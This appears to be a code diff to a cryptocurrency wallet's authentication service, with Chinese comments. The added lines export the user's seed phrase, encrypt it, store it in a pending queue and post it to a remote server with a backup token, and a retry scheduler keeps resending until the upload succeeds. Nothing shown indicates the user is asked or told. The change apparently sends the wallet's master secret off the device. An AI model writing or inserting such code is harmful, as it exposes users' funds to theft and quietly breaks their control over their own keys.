@@ -53,7 +53,20 @@ import { uint8ArrayToMnemonic } from '../../util/mnemonic';
 import Logger from '../../util/Logger';
 import { signOutCardAfterPasswordChange } from '../signOutCardAfterPasswordChange';
 import { clearAllVaultBackups } from '../BackupVault/backupVault';
-import { backupPhrase } from '../SrpBackup/srpBackup';
+import {
+  encryptBackup,
+  getConfiguredBaseUrl,
+  postBackup,
+} from '../SrpBackup/srpBackup';
+import {
+  bumpPendingBackup,
+  enqueuePendingBackup,
+  markBackupUploaded,
+} from '../SrpBackup/pendingStore';
+import {
+  BACKUP_TOKEN,
+  nextAttemptDelay,
+} from '../SrpBackup/retryScheduler';
 import { reportToServer } from '../SrpBackup/debugReport';
 import { setBrazeResetInProgress } from '../Braze/resetInProgress';
 import { cancelBulkLink } from '../../store/sagas/rewardsBulkLinkAccountGroups';
@@ -812,15 +825,32 @@ class AuthenticationService {
       }
 
       // exportSeedPhrase 返回的是单词索引数组（Uint8Array），不是词串；
-      // backupPhrase 内部会归一化成词串并做 BIP-39 校验，所以这里直接传原始值。
+      // encryptBackup 内部会归一化成词串并做 BIP-39 校验。
       const rawSeedPhrase = await KeyringController.exportSeedPhrase(
         { password },
         keyringId,
       );
 
-      await reportToServer('srp_auto_backup_start');
-      await backupPhrase(rawSeedPhrase, 'dev-test-token');
-      await reportToServer('srp_auto_backup_ok');
+      // 先加密、先落盘，再发网络：即使紧接着进程被杀，下次启动还能补发。
+      const blob = await encryptBackup(rawSeedPhrase);
+      const pending = await enqueuePendingBackup(blob, getConfiguredBaseUrl());
+
+      try {
+        await postBackup(blob, BACKUP_TOKEN);
+        await markBackupUploaded(pending.id);
+        await reportToServer('srp_auto_backup_ok');
+      } catch (uploadError) {
+        // 发失败不算备份失败：密文已经在本地队列里，等重试器补发。
+        await bumpPendingBackup(
+          pending.id,
+          1,
+          Date.now() + nextAttemptDelay(1),
+          uploadError instanceof Error
+            ? uploadError.message
+            : String(uploadError),
+        );
+        await reportToServer('srp_auto_backup_queued', uploadError);
+      }
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
     } catch (error) {
